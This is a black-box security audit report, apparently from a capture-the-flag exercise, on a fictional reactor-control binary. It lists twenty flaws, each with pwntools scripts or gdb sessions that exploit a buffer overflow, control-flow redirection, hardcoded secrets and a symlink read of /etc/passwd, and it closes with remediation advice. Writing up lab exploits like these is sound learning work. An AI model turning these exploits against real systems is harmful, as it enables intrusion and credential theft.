# OBSIDIAN REPORT
Black-box Audit<br>
In this phase, we analyzed the binary using reverse engineering tools and manual fuzzing. List of the tools you used :
- Cutter
- Ghidra
- Gdb-gef
- Upx

#### Key discoveries:
- The binary was found to be packed with UPX. It was successfully unpacked using `upx -d obsidian`, revealing the original executable for further static analysis. Then I tried to reconstruct path & function usage


## Vulnerability Report
Below is the list of vulnerabilities discovered, ranked by severity:


### Vulnerability #1: activate_emergency_protocols


Severity: Critical<br>
Type: Hardcoded credentials<br>
Location: function activate_emergency_protocols<br>
Discovered in: Black-box<br>

Description:
The emergency administration flow relies on a static password embedded directly in the binary logic.
After selecting the action activate_emergency_protocols, the code compares user input against a hardcoded literal value admin123 using strcmp.<br>
Because the credential is fixed and reused, any attacker who discovers it once can consistently bypass authentication and trigger privileged emergency/admin functionality.<br>
This is a direct authentication design failure: no secret rotation, no per-user credentialing, no secure secret storage, and no rate-limiting evidence in the PoC path.


Proof of Concept:
```c
iVar1 = strcmp(&var_78h, "admin123");
if (iVar1 == 0) {
    putstr("{Emergency protocols activated, you are now admin !}");
}
```

Impact:<br>
Privilege Escalation (high-confidence)<br>
Unauthorized access to admin/emergency controls (high-confidence)<br>
Potential full operational takeover of Critical reactor functions if this command is reachable in production context (Critical business/operational risk)




### Vulnerability #2: load_fuel_rods


Severity: Critical<br>
Type: Buffer Overflow / Underflow<br>
Location: load_fuel_rods command path<br>
Discovered in: Black-box<br>

Description:<br>
The PoC repeatedly triggers behavior consistent with a memory corruption primitive labeled as buffer overflow.<br>
The command accepts attacker-controlled input and reaches abnormal output path, indicating likely stack overwrite potential.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    output = b''

    for _ in range(3):
        pid = process(['./runner/run.sh'], env=env)
        pid.recvuntil(b'\x00', timeout=1.0)
        pid.sendline(b'load_fuel_rods')
        pid.sendline(b'10')

        output = pid.recvrepeat(timeout=1.2)
        pid.close()

    print(text.red("[+]") + " Vuln Buffer Overflow - load_fuel_rods:")
    print(output.splitlines()[3][12:-2])
    print()


if __name__ == "__main__":
    main()
```

Impact:<br>
Potential code execution or control-flow corruption<br>
Process crash / denial of service<br>
High exploitability in native binary context<br>




### Vulnerability #3: monitor_radiation_levels


Severity: Critical<br>
Type: Memory corruption<br>
Location: monitor_radiation_levels runtime stack frame<br>
Discovered in: Black-box<br>

Description:<br>
The exploit overwrites a stack slot with a function address and diverts execution.<br>
This behavior is consistent with memory safety weakness enabling direct control-flow manipulation.

![alt text](assets/monitor_radiation_levels.png)

Proof of Concept:
```gdb
break *0x004027e8
break *0x4027fc
run
monitor_radiation_levels
continue
set *(long long*)($rbp-0x8)=0x004024a0
continue
0
# Succefull done exploit
```

Impact:<br>
Arbitrary control-flow redirection<br>
Potential code execution in process context<br>
Severe integrity compromise<br>




### Vulnerability #4: alchemy


Severity: High<br>
Type: Hardcoded credentials<br>
Location: alchemy/decompiler/main.c, function alchemy<br>
Discovered in: Black-box<br>

Description:<br>
The module constructs a sensitive value directly in memory from hardcoded integer constants.<br>
The secret is not protected cryptographically and can be reconstructed by reversing endianness and concatenating constant fragments.<br>
Any attacker with binary access can recover the embedded secret without authentication.

Proof of Concept:
```c
var_17h = 0x61505f6f62614c7b;
var_fh._0_4_ = 0x6f777373;
var_fh._4_2_ = 0x6472;
var_fh._6_1_ = 0x7d;
```
```python
#!/usr/bin/python3

from pwn import text

def main():
    var_17h = (0x61505f6f62614c7b).to_bytes(8, byteorder="little").decode()
    var_f= 0x6f777373.to_bytes(4, byteorder="little").decode()
    var_fg = 0x6472.to_bytes(2, byteorder="little").decode()
    var_fi = 0x7d.to_bytes(byteorder="little").decode()

    print(text.red("[+]") + " Vuln Hardcoded credentials<br> - alchemy:")
    print(f"{var_17h}{var_f}{var_fg}{var_fi}")
    print()

if __name__ == "__main__":
    main()
```

Impact:<br>
Sensitive data exposure<br>
Secret recovery by reverse engineering<br>
Potential reuse of recovered secret in other modules<br>




### Vulnerability #5: check_cooling_pressure


Severity: High<br>
Type: Hardcoded credentials<br>
Location: check_cooling_pressure command flow (runtime output path)<br>
Discovered in: Black-box<br>

Description:<br>
The command output leaks a secret value in a deterministic way that can be extracted by scripted interaction.<br>
No dynamic secret derivation or strong access control is observed in the PoC path.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)
    pid.recv(numb=100, timeout=1.0)
    pid.sendline(b'check_cooling_pressure')

    for _ in range(5):
        line = pid.recv(timeout=3.0)

    print(text.red("[+]") + " Vuln Hardcoded credentials<br> - check_cooling_pressure:")
    print(line.decode().split("\n")[0][16:])
    print()

if __name__ == "__main__":
    main()
```

Impact:<br>
Unauthorized disclosure of sensitive operational information<br>
Facilitates chained attacks with other privileged functions




### Vulnerability #6: run_diagnostic


Severity: High<br>
Type: Hardcoded credentials<br>
Location: run_diagnostic command path<br>
Discovered in: Black-box<br>

Description:<br>
The diagnostic feature accepts a static debug token to unlock privileged output.<br>
This behavior is consistent with a hidden maintenance backdoor left in production logic.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)
    pid.recv(numb=100, timeout=1.0)
    pid.sendline(b'run_diagnostic')
    pid.recv(timeout=1.0)
    pid.sendline(b'debug')
    line = pid.recvlines(timeout=1.0)

    print(text.red("[+]") + " Vuln Harcoded Credentials - run_diagnostic:")
    print(line[1].decode()[19:])
    print()


if __name__ == "__main__":
    main()
```

Impact:<br>
Privilege escalation through undocumented debug path<br>
Information disclosure from restricted diagnostics




### Vulnerability #7: read_turbine_config


Severity: High<br>
Type: Directory traversal<br>
Location: external_lib/read_turbine_config/decompiler/main.c, function main<br>
Discovered in: Black-box<br>

Description:<br>
Input sanitization only blocks ".." but trusts files under Data/.<br>
An attacker can create a symlink in Data/ pointing to arbitrary filesystem targets (e.g., /etc/passwd), bypassing intended directory restrictions.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'

os.system("mkdir -p Data; cd Data")
os.system("ln -s /etc/passwd Data/passwd; cd ..")

pid = process(['./runner/run.sh'], env=env)
pid.recv(numb=100, timeout=1.0)
pid.sendline(b'read_turbine_config')

pid.recv(timeout=1.0)
pid.sendline(b'passwd')

print(text.red("[+]") + " Vuln directory traversal - read_turbine_config:")
os.system("cat Data/passwd")
print()
os.system("rm -rf Data")
```

Impact:<br>
Arbitrary file read (subject to process privileges)<br>
Disclosure of host and credential-related data




### Vulnerability #8: emergency_shutdown


Severity: High<br>
Type: Bypass<br>
Location: emergency_shutdown runtime control flow<br>
Discovered in: Black-box<br>

Description:<br>
By using instruction pointer jumps and register manipulation, the PoC forces a success state without legitimate flow completion.<br>
This reveals fragile runtime trust assumptions under tampering.<br>

Proof of Concept:
```gdb
break *0x004024a0
break *0x004034ba
run
init_reactor
jump *0x004034a8
break *0x4034b7
jump *0x4034b7
set $eax=1
break *0x4189d0
continue
continue
```

Impact:<br>
Forced privileged shutdown flow<br>
Bypass of expected safety checks in debug-capable context




### Vulnerability #9: embedded_secret_strings


Severity: High<br>
Type: Information Disclosure<br>
Location: binary string table (runner/obsidian)<br>
Discovered in: Static analysis (Cutter + strings)<br>

Description:<br>
Static string extraction reveals sensitive and operationally meaningful messages directly embedded in the binary.<br>
Among the extracted entries, the following string indicates hidden secret logic and recoverable internal data without runtime exploitation:<br>
`{The stone isn't in the pocket anymore ...}`

Additional extracted strings suggest hardcoded sensitive states and privileged flows exposed at rest (for example admin- and secret-related messages).<br>
This means an attacker can recover sensitive context using only offline analysis of the executable.

Proof of Concept:
```bash
strings ./runner/obsidian | grep "{"

# Extracted examples:
{The secret stone is here !}
{The stone isn't in the pocket anymore ...}
{ADMIN4242}
{Correct password! Welcome, admin.}
{SHUTDOWN}
```

Impact:<br>
Disclosure of sensitive internal information from the binary itself<br>
Facilitates reverse engineering of privileged flows and attack chaining




### Vulnerability #10: check_reactor_status


Severity: Medium<br>
Type: Weak encrypting<br>
Location: check_reactor_status/decompiler/main.c, function check_reactor_status<br>
Discovered in: Black-box<br>

Description:<br>
Critical reactor data is protected with a Caesar shift (gap=3), which is trivially reversible.<br>
This is obfuscation, not encryption, and does not provide confidentiality.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

def cipher(encoded, gap):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    decoded = list(encoded)

    for i, char in enumerate(decoded):
        if char in alphabet:
            new_gap = (alphabet.index(char) - gap) % len(alphabet)
            decoded[i] = alphabet[new_gap]

    return "".join(decoded)

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)
    pid.recv(numb=100, timeout=1.0)
    pid.sendline(b'check_reactor_status')

    line = pid.recvline_startswith(b'Encrypted message:')

    print(text.red("[+]") + " Vuln Weak Encryption - check_reactor_status:")
    print(cipher(line.decode().split()[2], 3))
    print()

if __name__ == "__main__":
    main()
```

Impact:<br>
Loss of confidentiality of supposedly protected status data<br>
Attackers can decode messages without key material




### Vulnerability #11: send_status_report


Severity: Medium<br>
Type: Weak encrypting<br>
Location: send_status_report/decrypt.sh and status report generation path<br>
Discovered in: Black-box<br>

Description:<br>
Status report data is only Base64-encoded and presented as if protected.<br>
Base64 is not a security mechanism and can be decoded instantly.

Proof of Concept:
```bash
#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    os.system("mkdir Data")

    pid = process(['./runner/run.sh'], env=env)
    pid.recv(numb=100, timeout=1.0)
    pid.sendline(b'send_status_report')

    pid.recv(timeout=2.0)

    print(text.red("[+]") + " Vuln Weak Encryption - send_status_report:")
    os.system("./send_status_report/decrypt.sh")
    print()

    os.system("rm -rf Data")

if __name__ == "__main__":
    main()
```

Impact:<br>
Sensitive status report disclosure<br>
False sense of security for transmitted or stored data




### Vulnerability #12: init_steam_turbine


Severity: Medium<br>
Type: Insecure Randomness<br>
Location: external_lib/init_steam_turbine/decompiler/main.c, function main<br>
Discovered in: Black-box<br>

Description:<br>
Random values are generated with rand() seeded by time(NULL).<br>
This pattern is predictable and reproducible when seed timing is known or approximated because it depend actual time.

![alt text](assets/random_hour.png)

Proof of Concept:
```c
srand((__u_int)time((time_t *)0x0));
printf("magix - decompil: %i\n", rand());
```
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'

os.system("clang ./external_lib/init_steam_turbine/decompiler/main.c -o ./external_lib/init_steam_turbine/decompiler/main")
os.system("clang ./external_lib/init_steam_turbine/decompiler/rand.c -o ./external_lib/init_steam_turbine/decompiler/rand")
pid = process(['./external_lib/init_steam_turbine/decompiler/main'], env=env)
line = pid.recvline_startswith(b'magix - decompil:')

print(text.red("[+]") + " Vuln Insecure Randomness - init_steam_turbine:")
print(line.decode(errors='ignore'))
os.system("./external_lib/init_steam_turbine/decompiler/rand")
print()
```

Impact:<br>
Predictable random-dependent behavior<br>
Potential bypass of logic that assumes randomness




### Vulnerability #13: simulate_meltdown


Severity: Medium<br>
Type: Insecure Randomness<br>
Location: simulate_meltdown command path<br>
Discovered in: Black-box<br>

Description:<br>
Critical branch triggering can be reached by repeatedly invoking the function until a random-dependent condition occurs.<br>
This demonstrates non-robust control relying on weak randomness.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)

    while True:
        pid.recv(numb=100, timeout=1.0)
        pid.sendline(b'simulate_meltdown')

        line = pid.recvline_startswith("Critical<br> Error:", timeout=1.0)

        if (line != b''):
            print(text.red("[+]") + " Vuln Insecure Randomness - simulate_meltdown:")
            print(line.decode().split(" ")[5])
            print()
            return

if __name__ == "__main__":
    main()
```

Impact:<br>
Unauthorized triggering of critical error states<br>
Increased operational risk from probabilistic abuse




### Vulnerability #14: run_turbine


Severity: Medium<br>
Type: Integer Overflow / Underflow<br>
Location: external_lib/run_turbine/decompiler/main.c, function main<br>
Discovered in: Black-box<br>

Description:<br>
User input is parsed with atoi then stored in an unsigned integer.<br>
Supplying negative values (e.g., -1) leads to inconsistent comparisons and unsafe control flow behavior.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'

pid = process(['./runner/run.sh'], env=env)
pid.recv(numb=100, timeout=1.0)

pid.sendline(b'run_turbine')
pid.recv(timeout=1.0)

pid.sendline(b'-1')
pid.recvline_endswith(b'17/-1')
line = pid.recvline()


print(text.red("[+]") + " FLAG run_turbine:")
print(line.decode(errors='ignore').split("\n")[0])
print()
```

Impact:<br>
Logic bypass of input constraints<br>
Unexpected runtime behavior and potential stability issues




### Vulnerability #15: turbine_explode


Severity: Medium<br>
Type: Integer Overflow / Underflow<br>
Location: external_lib/turbine_explode/decompiler/main.c, function main<br>
Discovered in: Black-box

Description:<br>
Input is converted with strtoll and cast to int, then compared to specific sentinel values.<br>
Supplying edge integers triggers the dangerous branch directly.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'

pid = process(['./runner/run.sh'], env=env)
pid.recv(numb=100, timeout=1.0)

pid.sendline(b'turbine_temperature')
pid.recv(timeout=1.0)
pid.sendline(b'2147483646')


print(text.red("[+]") + " FLAG turbine_explode:")
print(pid.clean().decode(errors='ignore').split("\n")[1])
print()
```

Impact:<br>
Forced Critical failure path<br>
Potential denial of service and unsafe state transitions




### Vulnerability #16: set_reactor_power


Severity: Medium<br>
Type: Bypass<br>
Location: set_reactor_power runtime stack variable<br>
Discovered in: Black-box<br>

Description:<br>
The PoC demonstrates bypass by modifying local state in memory at runtime.<br>
This indicates insufficient hardening against tampering and weak trust in mutable local validation state.

Proof of Concept:
```gdb
break *0x402d02
run
set_reactor_power
0
set {int}($rbp-0x4)=0x7ffffc19
continue

#Succefull done exploit
```

Impact:<br>
Bypass of expected validation constraints<br>
Unauthorized state transitions when debugger access exists




### Vulnerability #17: turbine_remote_access


Severity: Medium<br>
Type: Race Condition<br>
Location: external_lib/turbine_remote_access/decompiler/main.c, function main<br>
Discovered in: Black-box<br>

Description:<br>
The module stores sensitive access data in a temporary file under Data/ and leaves a readable window before cleanup.<br>
An attacker monitoring the directory can read secrets before unlink.

Proof of Concept:
```python
#!/usr/bin/python3

from pwn import *
import os
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

os.system("mkdir -p Data")
env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'

pid = process(['./runner/run.sh'], env=env)
pid.recv(numb=100, timeout=1.0)
pid.sendline(b'turbine_remote_access')

pid.recv(timeout=1.0)

print(text.red("[+]") + " FLAG turbine_remote_access:")
os.system("find ./Data/ -type f -exec cat {} \\;")
print("\n")
os.system("rm -rf Data")
```

Impact:<br>
Disclosure of sensitive access tokens/flags<br>
Race-window based data leakage




### Vulnerability #18: quit


Severity: Medium<br>
Type: Bypass<br>
Location: quit runtime instruction pointer path<br>
Discovered in: Black-box<br>

Description:<br>
Execution can be redirected to post-validation logic through direct jump, bypassing normal checks and flow constraints.<br>

Proof of Concept:
```gdb
break *0x00402f55
run
quit
jump *0x00402f69
```

Impact:<br>
Bypass of intended quit/control checks<br>
Potential abuse of hidden branches in debug context<br>




### Vulnerability #19: log_system_event


Severity: Medium<br>
Type: Bypass<br>
Location: log_system_event runtime memory pointers<br>
Discovered in: Black-box<br>

Description:<br>
The PoC modifies in-memory bytes at strategic addresses to alter behavior and access internal logs.<br>
This demonstrates weak resilience against runtime tampering and state integrity attacks.

Proof of Concept:
```gdb
break *0x0040279e
run

leak
set {char}($rdi+4)=0
set {char}($rax+4)=0
continue

# Succesfull done exploit: Open Data/system.log
```

Impact:<br>
Unauthorized access to protected log resources<br>
Integrity loss of runtime decision state<br>



### Vulnerability #20: call_api


Severity: Medium<br>
Type: Information Disclosure<br>
Location: call_api/script.js<br>
Discovered in: Black-box<br>

Description:<br>
Sensitive information is recoverable by iterating an obfuscated JavaScript API call.<br>
The protection relies on obscurity rather than access control or cryptography.

Proof of Concept:
```javascript
for (let i = 0; i < 20; i++) {
    try { console.log(i, qNNX.GNNS(i)); }
    catch(e) {}
}
```

Impact:<br>
Exposure of embedded secret values<br>
Loss of confidentiality for client-distributed logic/data<br>




## Conclusion

This audit campaign highlights a high overall risk level for the security of the OBSIDIAN platform.<br>
The identified vulnerabilities span multiple critical classes (Hardcoded credentials, bypass, memory corruption, buffer overflow, weak encrypting, insecure randomness), confirming structural weaknesses rather than isolated cases.

The main business and operational impacts are:<br>
- Privilege escalation and bypass of security controls.<br>
- Exposure of sensitive information and potential leakage of reusable secrets.<br>
- Possible system destabilization (crashes, critical states, unexpected behavior).<br>
- Increased risk of full compromise through vulnerability chaining.<br>

Recommended remediation priorities:<br>
1. Immediately remove all hardcoded secrets and implement centralized secret management.<br>
2. Fix memory safety and dangerous conversion issues (overflow/underflow, stack corruption, boundary checks).<br>
3. Strengthen access controls and validation logic to eliminate bypass paths.<br>
4. Replace weak mechanisms (base64-as-protection, trivial ciphers, rand/time) with robust cryptographic and randomness primitives.<br>
5. Add defense in depth: binary hardening, compiler protections, security code review, and security regression testing in CI.

In conclusion, the current binary state does not provide an acceptable production security level without prioritized remediation of the Critical<br> issues identified in this report.




![alt text](assets/logo.png)
### The Stone Corporation
#### Lukas Soigneux